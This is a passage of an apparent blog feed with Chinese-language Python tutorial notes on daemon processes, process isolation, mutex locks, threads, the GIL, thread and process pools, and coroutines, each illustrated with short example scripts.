class="hljs-keyword">in</span> ps:<br>        p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程结束&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(time.time() - start)<span class="hljs-comment"># ~3s</span><br></code></pre></td></tr></table></figure><h2 id="7-3-守护进程"><a href="#7-3-守护进程" class="headerlink" title="7-3 守护进程"></a>7-3 守护进程</h2><p><strong>主进程将一个子进程设置为守护进程，守护进程就会在主进程结束时随之结束不再运行</strong>。</p><ul><li><strong>守护进程内无法再开启子进程</strong>，否则抛出异常：AssertionError: daemonic processes are not allowed to have children</li><li><strong>在开启子进程之前将其设置为守护进程</strong></li><li><strong>主进程代码运行结束，守护进程随即终止</strong>，不受别的子进程的影响。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;i am coming&#x27;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;i am backing&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = Process(target=task)<br>    p.daemon = <span class="hljs-literal">True</span><span class="hljs-comment"># p.start()之前将子进程设置为守护进程，陪着主进程一块结束。</span><br>    p.start()<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;i am master&#x27;</span>)<br></code></pre></td></tr></table></figure><p>示例2：各子进程相互独立，不会因为一个子进程设置为守护进程而影响另一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> am coming&#x27;</span>)<br>    time.sleep(i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span> am backing&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>):<br>        p = Process(target=task, args=[i])<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">3</span>:<span class="hljs-comment"># 编号为3的子进程设置为守护进程，当主进程执行结束后就被回收了</span><br>            p.daemon = <span class="hljs-literal">True</span><br>        p.start()<br><br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;master&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="7-4-进程隔离内存空间"><a href="#7-4-进程隔离内存空间" class="headerlink" title="7-4 进程隔离内存空间"></a>7-4 进程隔离内存空间</h2><p><strong>进程之间内存空间是隔离的，即进程j间数据是隔离的，互不影响</strong>。</p><p>因为这是两个独立的名称空间。子进程有其自己的名称空间，只是修改其名称空间内全局变量的值，而不影响父进程自己名称空间全局变量的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br>money = <span class="hljs-number">100</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():<br>    <span class="hljs-keyword">global</span> money<br>    money = <span class="hljs-number">666</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子&#x27;</span>, money)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = Process(target=task)<br>    p.start()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主&#x27;</span>, money)<br></code></pre></td></tr></table></figure><h2 id="7-5-互斥锁"><a href="#7-5-互斥锁" class="headerlink" title="7-5 互斥锁"></a>7-5 互斥锁</h2><p>进程之间数据不共享，但是共享同一套文件系统，所以访问同一个文件，或同一个打印终端，是有问题的。</p><p>示例1：进程不共享数据导致的数据混乱问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Lock<br><span class="hljs-keyword">import</span> json, time, random<br><br><br><span class="hljs-comment"># 查票</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        dic = json.load(f)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s查询余票：%s&#x27;</span> % (i, dic.get(<span class="hljs-string">&#x27;ticket_num&#x27;</span>)))<br>    <span class="hljs-keyword">return</span> dic<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">i</span>):<br>    dic = search(i)<span class="hljs-comment"># 先查票</span><br><span class="hljs-comment"># 再买票</span><br>    time.sleep(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">if</span> dic.get(<span class="hljs-string">&#x27;ticket_num&#x27;</span>) &gt; <span class="hljs-number">0</span>:<br>        dic[<span class="hljs-string">&#x27;ticket_num&#x27;</span>] -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            json.dump(dic, f)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s买票成功&#x27;</span> % i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s买票失败&#x27;</span> % i)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>        p = Process(target=buy, args=[i])<br>        p.start()<br></code></pre></td></tr></table></figure><p>共享带来的是竞争，竞争带来的结果就是错乱。控制的方式就是加锁处理，即每个进程依次使用资源。</p><p>示例2：互斥锁，保证数据安全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Lock<br><span class="hljs-keyword">import</span> json, time, random<br><br><br><span class="hljs-comment"># 查票</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        dic = json.load(f)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s查询余票：%s&#x27;</span> % (i, dic.get(<span class="hljs-string">&#x27;ticket_num&#x27;</span>)))<br><br><br><span class="hljs-comment"># 买票  1.先查 2.再买</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">i, mutex</span>):<br>    search(i)<br>    mutex.acquire()  <span class="hljs-comment"># 抢锁, 给买票环节加锁处理</span><br>    time.sleep(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        dic = json.load(f)<br>        ticket_num = dic[<span class="hljs-string">&quot;ticket_num&quot;</span>]<br>    <span class="hljs-keyword">if</span> ticket_num &gt; <span class="hljs-number">0</span>:<br>        dic[<span class="hljs-string">&#x27;ticket_num&#x27;</span>] -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            json.dump(dic, f)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s买票成功&#x27;</span> % i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;用户%s买票失败&#x27;</span> % i)<br>    mutex.release()  <span class="hljs-comment"># 释放锁</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 在主进程中生成一把锁 让所有的子进程抢 谁先抢到谁先买票</span><br>    mutex = Lock()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>):<br>        p = Process(target=buy, args=[i, mutex])<br>        p.start()<br></code></pre></td></tr></table></figure><p>加锁处理的结果就是：<strong>将并发变成串行，牺牲效率，保证数据的安全</strong></p><h2 id="7-6-多线程"><a href="#7-6-多线程" class="headerlink" title="7-6 多线程"></a>7-6 多线程</h2><p>基础知识：</p><ul><li>一个程序的运行过程是一个进程，<strong>每个进程自带一个控制线程</strong>。</li><li><strong>进程是一个资源单位，线程是具体的执行单位</strong>。</li><li>进程相当于一个车间，线程相当于车间内的流水线，车间内可以有多条流水线，即一个进程内可以有多个线程。</li><li>多线程之间共享数据资源，相当于一个车间内有多条流水线，都共用一个车间的资源。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">进程: 资源单位(起一个进程是在内存空间中开辟一块独立的空间)<br>线程: 执行单位(真正被干活的是进程里面的线程，线程在执行中所需要使用到的资源都找所在的进程索要)<br><br><span class="hljs-comment"># 开进需要开内存空间，程资源消耗大</span><br><span class="hljs-comment"># 开线程无需再次申请内存空间操作，消耗小</span><br><span class="hljs-comment"># 开线程的开销要远远的小于进程的开销。同一个进程下的多个线程数据是共享的</span><br></code></pre></td></tr></table></figure><p>为什么使用多线程：如果多个任务共用一块地址空间，那么必须在一个进程内开启多个线程。</p><p>示例：开线程的两种方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是子线程&#x27;</span>)<br><br><br><span class="hljs-comment"># 方式1：直接使用Thread实例化线程对象</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    t = Thread(target=task)<br>    t.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是主线程&#x27;</span>)<br><br><br><span class="hljs-comment"># 方式2：继承Therad，自定自己的线程类，重写run方法</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span>(<span class="hljs-title class_ inherited__">Thread</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        task()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    t = MyThread()<br>    t.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是主线程&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="7-7-线程共享内存空间"><a href="#7-7-线程共享内存空间" class="headerlink" title="7-7 线程共享内存空间"></a>7-7 线程共享内存空间</h2><blockquote><p>补充：线程的知识点和进程的知识点类似，可以举一反三的学习。</p></blockquote><p><strong>同一个进程下的多个线程是共享当前进程下的数据资源的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>n = <span class="hljs-number">100</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <span class="hljs-keyword">global</span> n<br>    n = <span class="hljs-number">200</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子线程:&#x27;</span>, n)<span class="hljs-comment"># 110</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    t = Thread(target=func)<br>    t.start()<br>    <span class="hljs-comment"># t.join()</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主线程:&#x27;</span>, n)<br></code></pre></td></tr></table></figure><h2 id="7-8-GIL"><a href="#7-8-GIL" class="headerlink" title="7-8 GIL"></a>7-8 GIL</h2><p>全局解释器锁（GIL， Global Interpreter Lock）。</p><p>结论：<strong>在Cpython解释器中，同一个进程下开启的多线程，同一时刻只能有一个线程执行，无法利用多核优势</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 程序的代码需要交给解释器执行，因此该进程内的每个线程都需要将共享的代码交给解释器执行，这就有了竞争。</span><br><span class="hljs-comment"># 垃圾回收机制GC也是当前进程内的一个干活的线程，GC会和当前进程内其他线程有抢代码数据的竞争，因此有了GIL。</span><br><span class="hljs-comment"># GIL保证进程内同一时刻只有一个线程在运行，这样做是为了保证内存管理（垃圾回收机制GC）的运行。</span><br></code></pre></td></tr></table></figure><p>总结：</p><ul><li><strong>GIL不是python语言的特性，它是Cpython解释器引用的一个概念。</strong></li><li><strong>GIL本质是一把互斥锁，是将线程从并发变为串行，牺牲效率保证数据安全。</strong></li><li><strong>保护不同的数据要加不同的互斥锁，GIL保护的是解释器级别的数据安全。</strong></li></ul><p><img src="/img/python/image-20220514173429195.png" alt="image-20220514173429195"></p><p>首先明确：<strong>python多线程无法利用计算机的多核优势</strong>。</p><p>但是python多线程可以实现并发的，且不是所有的场合都要使用多核的。</p><p>场合：</p><ul><li><strong>对于计算密集型，多进程优于多线程</strong>（多进程的并行计算优势突出了）</li><li><strong>对于IO密集型，多线程优于多进程</strong>（开进程的开销大缺陷放大了）</li></ul><p>结论：<strong>python多线程无法使用多核优势，不等于多线程一无是处</strong>。</p><h2 id="7-9-进程池和线程池"><a href="#7-9-进程池和线程池" class="headerlink" title="7-9 进程池和线程池"></a>7-9 进程池和线程池</h2><p>基础知识：</p><ul><li>无论是开进程还是开线程，都需要消耗资源，只不过开线程的比开进程的消耗更少。</li><li>不可能无限制的开进程或线程，因为计算机硬件的资源是有限的。</li><li>为了保证服务器一定的处理能力，只能采取<code>池</code>的概念。</li><li>池：就是限制开进程或开线程的数量，比如开多线程，限制最多开10个线程，那这个线程池的大小就是10，也就是说最多只有10个线程在干活。</li></ul><p>示例1：线程池和进程池的基本使用（都是使用concurrent.futures模块）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">n</span>):  <span class="hljs-comment"># 处理任务的函数</span><br>    time.sleep(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<br>    <span class="hljs-built_in">print</span>(n ** <span class="hljs-number">2</span>)<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pool = ThreadPoolExecutor(<span class="hljs-number">5</span>)<span class="hljs-comment"># 开一个大小是5的线程池</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        pool.submit(task, i)<span class="hljs-comment"># 提交任务和任务需要的参数</span><br></code></pre></td></tr></table></figure><p>示例2：增加回调函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">n</span>):  <span class="hljs-comment"># 处理任务的函数</span><br>    time.sleep(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<br>    <span class="hljs-keyword">return</span> n ** <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">call_back</span>(<span class="hljs-params">future</span>):<span class="hljs-comment"># 需要定义一个形参，这个形参是future，通过future.result()获取任务执行返回值。</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;call_back&gt;&gt;&gt;:&#x27;</span>, future.result())<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pool = ThreadPoolExecutor(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>        pool.submit(task, i).add_done_callback(call_back)<br>        <span class="hljs-comment"># 给任务绑定回调函数，任务结束后自动调用回调函数，并将future对象当实参传给回调函数。</span><br></code></pre></td></tr></table></figure><p>示例3：map函数快速获取结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">n</span>):  <span class="hljs-comment"># 处理任务的函数</span><br>    time.sleep(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>))<br>    <span class="hljs-keyword">return</span> n ** <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pool = ThreadPoolExecutor(<span class="hljs-number">5</span>)<br>    rets = pool.<span class="hljs-built_in">map</span>(task, <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>))<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rets:<br>        <span class="hljs-built_in">print</span>(r)<br><span class="hljs-comment"># map第一个参数是任务，第二个参数是迭代器，迭代器的每个元素依次传给任务当实参</span><br><span class="hljs-comment"># map返回一个生成器，可以直接获取每个任务的结果</span><br></code></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ul><li>池子一旦造出来后，固定了线程或进程 ，不会再变更，所有的任务都是这些进程或线程处理。</li><li><strong>这些进程或线程不会再出现重复创建和销毁的过程。</strong></li><li><strong>任务的提交是异步的，异步提交任务的返回结果 应该通过回调机制来获取。</strong></li><li><strong>回调机制就相当于，把任务交给一个员工完成，它完成后主动找你汇报完成结果。</strong></li></ul><h2 id="7-10-协程【伪】"><a href="#7-10-协程【伪】" class="headerlink" title="7-10 协程【伪】"></a>7-10 协程【伪】</h2><p>协程是单线程下的并发，<strong>协程是一种用户态的轻量级线程，即协程是由用户程序自己控制调度的。</strong></p><p>协程的切换开销更小，属于程序级别的切换，操作系统完全感知不到，因而更加轻量级；<strong>单线程内就可以实现并发的效果，最大限度地利用cpu</strong></p><p>示例1：基于yield实现代码块切换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> f2()<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">yield</span> <span class="hljs-number">4</span><br><br><br>generator = f1()<span class="hljs-comment"># f1()是生成器</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> generator:<br>    <span class="hljs-built_in">print</span>(i)<span class="hljs-comment"># 依次打印：1 3 4 2</span><br></code></pre></td></tr></table></figure><p>示例2：使用asyncio实现协程【官方推荐】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">f1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<span class="hljs-comment"># 等 可以等待的对象</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">2</span>)<br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">f2</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-number">4</span>)<br><br><br>tasks = [<br>    asyncio.ensure_future(f1()),<br>    asyncio.ensure_future(f2())<br>]<br><br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.wait(tasks))<br></code></pre></td></tr></table></figure><p>严格来说，其实Python并没有协程，是一种伪协程，因为python的协程只是一种异步编码思想，而没有一个完整生命周期</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之元类（六）</title>
    <link href="/2024/03/20/606python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%85%83%E7%B1%BB%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <url>/2024/03/20/606python%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%85%83%E7%B1%BB%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    
